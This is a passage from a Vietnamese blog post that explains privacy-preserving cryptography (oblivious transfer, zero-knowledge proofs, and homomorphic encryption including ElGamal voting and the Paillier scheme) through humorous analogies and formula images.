<p>Để hóc búa hơn, người ta đã phát minh ra giao thức rất hay ho đó là Chuyển giao không lộ thông tin ( Oblivious Transfer ) đơn giản thế này:  Anh Mao giữ 2 giá trị <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_9865b118af4cfc107929ec116ab9eb80.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> là bít tức là chỉ có 0 hoặc 1, chị MaiAnh giữ một giá trị secret s, tất nhiên, cũng chỉ là bít 01. Chị chọn một số u ngẫu nhiên khá to trong tập nguyên <strong>Z</strong> và chị tính <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7cb433fd43ea022f61fa76e4d73a28d8.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> với <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_7997a21e02329ca6c6bc77e68e43277e.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. Do <em>s</em> là bit nên lúc này chị có 2 giá trị <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_f6bf330e68e6b2523ee18338347b8e2a.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, chị gửi cả 2 giá trị này lại cho Mao với mục đích làm Mao không biết giá trị <em>u, s</em> là gì, kể cả giá trị <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b2f5ff47436671b6e533d8dc3614845d.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> ở đây là generator chung mà cả 2 đều biết, thì theo bạn <a href="https://en.wikipedia.org/wiki/ElGamal_encryption">ElGamal </a>đối với máy tính cổ lỗ của Mao là con MBP 15 inch đời giữa 2015, tới lúc bốc mộ cũng không giải ra được <em>u</em> (à mà với điều kiện là chị MaiAnh có <em>u</em> rất to nhé). Sau bước này thì Mao chọn 2 giá trị <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_53dd2b7a99cd54e0d6febbc311e5b554.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> cũng ngẫu nhiên trong tập nguyên để tính một phương trình phức tạp hơn đó là:</p>
<p><span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_ae26caf67145aba703126c109d33ea19.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
<p>Rồi Mao chuyển lại cặp <span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_dbdce35eb2f44b7d782b3408c9661212.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> để cho MaiAnh tính ra <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_d9094fb8cc52a45fb6338a51d0b15d53.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. Như vậy, Mao không để lộ cả 2 giá trị <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_9865b118af4cfc107929ec116ab9eb80.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span>, trong khi MaiAnh không để lộ <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_03c7c0ace395d80182db07ae2c30f034.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:2px;' class='tex' alt="" data-recalc-dims="1" /></span> mà vẫn lấy được <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_a727b3abb09c0ecf8898343a5bbeffb1.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; padding-bottom:1px;' class='tex' alt="" data-recalc-dims="1" /></span> về. Mao cũng không biết được MaiAnh đã lấy số nào về mà chỉ biết MaiAnh đã lấy được 1 số. Tóm tắt lại trong hình như sau:</p>
<p><a href="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?ssl=1"><img data-attachment-id="563" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-3/" data-orig-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?fit=389%2C187&amp;ssl=1" data-orig-size="389,187" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?fit=300%2C144&amp;ssl=1" data-large-file="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?fit=389%2C187&amp;ssl=1" class="aligncenter wp-image-563 size-full" src="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?resize=389%2C187&#038;ssl=1" alt="Untitled" width="389" height="187" srcset="https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?w=389&amp;ssl=1 389w, https://i1.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-2.png?resize=300%2C144&amp;ssl=1 300w" sizes="(max-width: 389px) 100vw, 389px" data-recalc-dims="1" /></a></p>
<p>Câu hỏi đặt ra OT sẽ được áp dụng như thế nào, ví dụ anh Mích đang làm hệ thống e-Health sức khỏe y tế điện tử. Vì anh là bên thứ 3 làm tin học nên tất nhiên anh không được ông quan thanh liêm nào cho tiếp cận vào hồ sơ y tế của bệnh nhân. Do đó anh quyết định ký hợp đồng với bệnh viện sử dụng OT để làm API truy cập thông tin. Lúc này anh làm demo nên cơ sở dữ liệu mới có thông tin HIV của 2 bệnh nhân lưu dưới dạng dương tính (1) và âm tính (0). Áp dụng OTP anh Mích đã có thể biết trạng thái HIV của 1 trong 2 bệnh nhân mà bệnh viên không biết anh đã query bệnh nhân nào.</p>
<p><strong>3.ZKP</strong></p>
<p>Bệnh cạnh việc dùng OT để chia sẻ không lộ thông tin, người ta còn nghĩ ra nhiều trò phức tạp khác dưới cái tên <strong>ZKP (Zero Knowledge Proof)</strong> điển hình là bài toán lên bar của chụy Mích được trình bày như sau: Trong một lần trên bar hơi muộn vào khoảng 2 giờ sáng thì các anh pokemon ập vào đòi kiểm tra hành chính với lý do trên 18 tuổi mới được ngồi bar hút thuốc bú diệu như một số hoa hậu nào đó. Vốn là một người tôn trọng quyền con người chụy không muốn ai phán xét vì hút thuốc lá là quyền tự do của mỗi người. Chụy chân thành chúc mừng bạn chụy nếu em bỏ được thuốc, còn không em cũng đừng buồn vì sau một thời gian nghỉ, điếu thuốc sắp tới em hút đảm bảo nó sẽ ngon không bút nào tả xiết. Ngoài ra lại vốn là một người tôn trọng quyền con người chụy cũng không muốn để lộ liễu ngày sinh nhật của mình giữa chốn đông người. Thay vì trình ID CMND hay bằng lái chụy đã show thẻ ngân hàng của mình để quẹt bill cho các anh xem. Với luật trên 18 tuổi mới được làm credit card nên mặc nhiên chụy đã chứng minh mình đã trên 18 tuổi mà không để lộ ngày sinh của mình <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?ssl=1"><img data-attachment-id="566" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/sexy_girl/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="sexy_girl" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-566" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?resize=25%2C25&#038;ssl=1" alt="sexy_girl" width="25" height="25" data-recalc-dims="1" /></a>.</p>
<p>Một ví dụ ZKP thứ 2 đó là ví dụ hang động của AliBaBa:</p>
<p><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?ssl=1"><img data-attachment-id="567" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-4/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?fit=277%2C187&amp;ssl=1" data-orig-size="277,187" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?fit=277%2C187&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?fit=277%2C187&amp;ssl=1" class="size-full wp-image-567 aligncenter" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-3.png?resize=277%2C187&#038;ssl=1" alt="Untitled" width="277" height="187" data-recalc-dims="1" /></a></p>
<p>Nhi tuyên bố rằng cô biết mật mã để mở cửa hang. Líp hỏi cô phải chứng minh tuyên bố của mình. Nhưng Nhi không thể nói mật khẩu cho Líp vì như vậy thật là lộ liễu <a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?ssl=1"><img data-attachment-id="566" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/sexy_girl/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="sexy_girl" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-566" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/sexy_girl.png?resize=25%2C25&#038;ssl=1" alt="sexy_girl" width="25" height="25" data-recalc-dims="1" /></a>. Do đó chụy Mích đã chỉ cho Nhi một cách như sau:</p>
<ul>
<li>Líp đứng quay mặt tụt quần ở một khoảng cách khá xa và chờ Nhi bước vào hang.<br />
Sau đó, Líp đến cửa hang rõ ràng anh ta không biết Nhi đã đi sang bên nào.</li>
<li>Líp tùy ý hét lên yêu cầu Nhi bước ra từ bên trái hoặc bên phải.</li>
<li>Hai đứa lặp lại trò chơi này cho đến khi Líp bị thuyết phục hoặc Nhi chán không chơi nữa.</li>
</ul>
<p>Rõ ràng nếu Nhi đã ở phía bên trái và Líp yêu cầu cô ấy đến từ bên trái thì quả này Nhi đã may mắn <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=24%2C24&#038;ssl=1" alt="surrender" width="24" height="24" data-recalc-dims="1" /></a>. Nếu không, Nhi chỉ có thể đến từ bên trái nếu cô ấy biết mật mã để mở cửa hang phải không nào (!?).</p>
<p><strong>4.Hệ mật đồng cấu( Homomorphic cryptosystem)</strong></p>
<p>Để tiếp tục là cuộc chơi thêm phần phức tạp, các nhà mật mã học lại tiếp tục nghĩ ra Hệ mật đồng cấu được định nghĩa:</p>
<p><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?ssl=1"><img data-attachment-id="570" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-5/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?fit=463%2C159&amp;ssl=1" data-orig-size="463,159" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?fit=300%2C103&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?fit=463%2C159&amp;ssl=1" class="aligncenter wp-image-570 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?resize=463%2C159&#038;ssl=1" alt="Untitled" width="463" height="159" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?w=463&amp;ssl=1 463w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-4.png?resize=300%2C103&amp;ssl=1 300w" sizes="(max-width: 463px) 100vw, 463px" data-recalc-dims="1" /></a></p>
<p>Hệ mã hoá Elgamal có tính chất đồng cấu, nhờ nó có thể tính được kết quả trong cuộc bỏ phiếu “chọn một trong hai”, mà không cần giải mã từng lá phiếu. Sơ đồ chia sẻ bí mật Shamir phối hợp với hệ mã hoá Elgamal còn có tính chất đặc biệt hơn nữa, nhờ nó có thể chia lá phiếu thành nhiều mảnh, cử tri gửi mỗi mảnh cho một thành viên ban kiểm phiếu, khi khớp các mảnh phiếu lại sẽ được nội dung đầy đủ của lá phiếu. Bài báo này trình bày các tính chất trên và chỉ ra ứng dụng của chúng trong bỏ phiếu từ xa.Hệ mã hoá Elgamal có tính chất đồng cấu, nhờ nó có thể tính được kết quả trong cuộc bỏ phiếu “chọn một trong hai”, mà không cần giải mã từng lá phiếu. Sơ đồ chia sẻ bí mật Shamir phối hợp với hệ mã hoá Elgamal còn có tính chất đặc biệt hơn nữa, nhờ nó có thể chia lá phiếu thành nhiều mảnh, cử tri gửi mỗi mảnh cho một thành viên ban kiểm phiếu, khi khớp các mảnh phiếu lại sẽ được nội dung đầy đủ của lá phiếu. (ref2 Trịnh Nhật Tiến, Đặng Thu Hiền, Trương Thị Thu Hiền, Lương Việt Nguyên)</p>
<p class="">Để rõ thêm về vấn đề này, bạn đọc có thể xem lại bài <a href="https://babyphd.net/2016/03/introduction-to-threshold-signature-scheme/">Introduction to Threshold signature scheme</a>. Lưu ý Elgamal có tính chất đồng cấu còn RSA thì không nhé <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img data-attachment-id="568" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/surrender/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="surrender" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=25%2C25&#038;ssl=1" alt="surrender" width="25" height="25" data-recalc-dims="1" /></a>. Ở khuôn khổ bài viết này chỉ trình bày thêm về hệ mã Paillier công bố năm 1999 như sau:</p>
<p class="">Giả sử n = pq và g là một phần tử đặc biết của <a href="https://vi.wikipedia.org/wiki/Nh%C3%B3m_(to%C3%A1n_h%E1%BB%8Dc)#Nh.C3.B3m_xiclic">nhóm cyclic</a> Z dựa theo lũy thừa n sao cho <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_5c6997547b6627b1b35a5ce698c5a298.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>. Khóa bí mật <span class='MathJax_Preview'><img src='https://i0.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b41b9dd23fcbbf9d222a2b66fd285d85.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span>, khóa công khai (g, n). Với plaintext là thông điệp <span class='MathJax_Preview'><img src='https://i1.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_b35275cb2846fd1f47f7772df7bb08fc.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span> và một số r nguyên dương ngẫu nhiên thì hàm mã hóa được định nghĩa:<br />
<span class='MathJax_Preview'><img src='https://i2.wp.com/babyphd.net/wp-content/plugins/latex/cache/tex_ce9d9741c5d2c87fc79319bb44b3fb85.gif?w=604&#038;ssl=1' style='vertical-align: middle; border: none; ' class='tex' alt="" data-recalc-dims="1" /></span></p>
<p class="">Lưu ý lcm = least common multiple ước chung nhỏ nhất. Và người ta thường chọn g=n+1 để thỏa mãn tính chất generator như sau:</p>
<p class=""><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?ssl=1"><img data-attachment-id="576" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-6/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?fit=384%2C169&amp;ssl=1" data-orig-size="384,169" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?fit=300%2C132&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?fit=384%2C169&amp;ssl=1" class="aligncenter wp-image-576 size-full" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?resize=384%2C169&#038;ssl=1" alt="Untitled" width="384" height="169" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?w=384&amp;ssl=1 384w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-5.png?resize=300%2C132&amp;ssl=1 300w" sizes="(max-width: 384px) 100vw, 384px" data-recalc-dims="1" /></a></p>
<p class="">Còn quá trình giải mã thì phức tạp hơn chút, đó là:</p>
<p class=""><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?ssl=1"><img data-attachment-id="577" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-7/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?fit=823%2C410&amp;ssl=1" data-orig-size="823,410" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?fit=300%2C149&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?fit=604%2C301&amp;ssl=1" class="alignnone wp-image-577 " src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?resize=542%2C270&#038;ssl=1" alt="Untitled" width="542" height="270" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?w=823&amp;ssl=1 823w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?resize=300%2C149&amp;ssl=1 300w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-6.png?resize=768%2C383&amp;ssl=1 768w" sizes="(max-width: 542px) 100vw, 542px" data-recalc-dims="1" /></a></p>
<p class="">Vậy tại sao có RSA phổ cập nông thôn đã chất chơi người dơi rồi, các nhà mật mã học lại phải nghĩ ra hệ mật oái ăm này <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?ssl=1"><img class="alignnone wp-image-568" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/surrender.png?resize=24%2C24&#038;ssl=1" alt="surrender" width="24" height="24" data-recalc-dims="1" /></a>. Ấy là vì ở đây ta có random r, mỗi lần mã hóa lại có ciphertext khác nhau. Ngoài ra với mỗi ciphertext nếu không biết random r thì lại ra vô số message m thỏa khác nhau. Ngoài ra với tính chất đồng cấu giúp cho phép cộng (+) và lũy thừa (^) ta có thể thiết kế các giao thức mã hóa gửi đi ciphertext để một bên thứ ba tính toán, bên tính toán này chỉ trả về kết quả phép tính mà không biết giá trị mà bên cần tính đưa ra là gì <a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?ssl=1"><img data-attachment-id="565" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/boss/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-orig-size="128,128" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="boss" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?fit=128%2C128&amp;ssl=1" class="alignnone wp-image-565" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/boss.png?resize=27%2C27&#038;ssl=1" alt="boss" width="27" height="27" data-recalc-dims="1" /></a></p>
<p class=""><a href="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?ssl=1"><img data-attachment-id="578" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-8/" data-orig-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?fit=659%2C153&amp;ssl=1" data-orig-size="659,153" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?fit=300%2C70&amp;ssl=1" data-large-file="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?fit=604%2C140&amp;ssl=1" class="alignnone wp-image-578 size-full" src="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?resize=604%2C140&#038;ssl=1" alt="Untitled" width="604" height="140" srcset="https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?w=659&amp;ssl=1 659w, https://i2.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-7.png?resize=300%2C70&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
<p class="">Ví dụ giao thức đơn giản Alice có <strong>publickey</strong> (để mã hóa) và 2 số tiền của 2 orders mà Bob đặt hàng đã được mã hóa<strong> [a], [b]</strong>. Alice không thể giải mã để biết <strong>a, b</strong> nhưng lại muốn tính tổng tiền<strong> [a+b]</strong>. Bob ở đây có <strong>secretkey</strong> có khả năng giải mã để tính phép cộng cho Alice nhưng hệ thông không muốn Bob biết Alice đang muốn tính gì.</p>
<p class=""><a href="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?ssl=1"><img data-attachment-id="579" data-permalink="https://babyphd.net/2016/09/07/an-toan-tinh-toan-da-thanh-vien/untitled-9/" data-orig-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?fit=724%2C273&amp;ssl=1" data-orig-size="724,273" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Untitled" data-image-description="" data-medium-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?fit=300%2C113&amp;ssl=1" data-large-file="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?fit=604%2C228&amp;ssl=1" class="alignnone size-full wp-image-579" src="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?resize=604%2C228&#038;ssl=1" alt="Untitled" width="604" height="228" srcset="https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?w=724&amp;ssl=1 724w, https://i0.wp.com/babyphd.net/wp-content/uploads/2016/09/Untitled-8.png?resize=300%2C113&amp;ssl=1 300w" sizes="(max-width: 604px) 100vw, 604px" data-recalc-dims="1" /></a></p>
